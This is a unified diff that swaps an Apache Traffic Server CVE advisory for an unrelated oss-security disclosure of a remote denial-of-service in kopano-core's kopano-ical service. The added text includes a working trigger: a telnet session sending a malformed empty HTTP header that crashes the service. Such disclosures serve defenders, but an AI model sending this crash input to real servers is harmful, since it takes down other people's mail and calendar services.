@@ -1,50 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/11/02/11
-Message-Id: <FE20B052-A91A-4772-AEE7-37B56AD91754@apache.org>
-Date: Tue, 2 Nov 2021 14:25:48 -0700
-From: Bryan Call <bcall@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/04/02/1
+Message-ID: <op516nqr-96s1-3r69-4np9-314p89o96951@inai.de>
+Date: Fri, 2 Apr 2021 10:26:29 +0200 (CEST)
+From: Jan Engelhardt <jengelh@...i.de>
 To: oss-security@...ts.openwall.com
-Subject: Apache Traffic Server is vulnerable to various smuggle, DOS, and validation attacks
+Subject: kopano-core 11.0.1.77: Remote DoS with out-of-bounds access
 Content-Type: text/plain; charset=utf-8
 
-Description:
-Apache Traffic Server is vulnerable to various smuggle, DOS, and validation attacks
+Initial publication, no CVE number yet.
 
-CVE (8.1.x and 9.1.x):
-CVE-2021-37147 Request Smuggling - LF line ending
-CVE-2021-37148 Request Smuggling - transfer encoding validation
-CVE-2021-37149 Request Smuggling - multiple attacks
-CVE-2021-41585 ATS stops accepting connections on FreeBSD
-CVE-2021-43082 heap-buffer-overflow with stats-over-http plugin
+# Affected versions
 
-CVE (8.1.x):
-CVE-2021-38161 Not validating origin TLS certificate
+  * kopano-core 11.0.1
+  * kopano-core 8.7.20
+  * it is believed this affects all other versions too,
+    including 10.0.7, 9.1.0, and zarafa 7.2.6.
 
-Reported By:
-Mattias Grenfeldt and Asta Olofsson (CVE-2021-37147, CVE-2021-37148, CVE-2021-37149)
-Asbjorn Bjornstad (CVE-2021-41585)
-Masaori Koshiba (CVE-2021-43082)
-Robert Butts (CVE-2021-38161)
+The "kopano-ical" program implements a network service/trivial HTTP 
+server. It fails to properly check HTTP headers, and with a crafted 
+request, can be exploited to drive the process into an exception and 
+have it terminate.
 
-Vendor:
-The Apache Software Foundation
 
-Version Affected:
-ATS 8.0.0 to 8.1.2
-ATS 9.0.0 to 9.1.0
+# Trigger
 
-Mitigation:
-8.x users should upgrade to 8.1.3 or later versions
-9.x users should upgrade to 9.1.1 or later versions
+» ./kopano-ical -F &
+» telnet localhost 8000
+Trying ::1...
+Connected to localhost.
+Escape character is '^]'.
+GET / HTTP/1.0
+Foo:
+Connection closed by foreign host.
+terminate called after throwing an instance of 'std::out_of_range'
+  what():  basic_string::substr: __pos (which is 6) > this->size() (which is 5)
 
-References:
-  Downloads:
-    https://trafficserver.apache.org/downloads
-    (Please use backup sites from the link only if the mirrors are unavailable) 
-  CVE:
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37147
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37148
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37149
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41585
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43082
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38161
+
+# Mitigation
+
+In conjunction with a proxy, the issue does not occur as they often 
+filter lines (LF->CRLF, giving an extra byte). Tested ones: 
+nginx-1.19.8 squid-4.14 apache2-2.4.46 tinyproxy-1.10.0
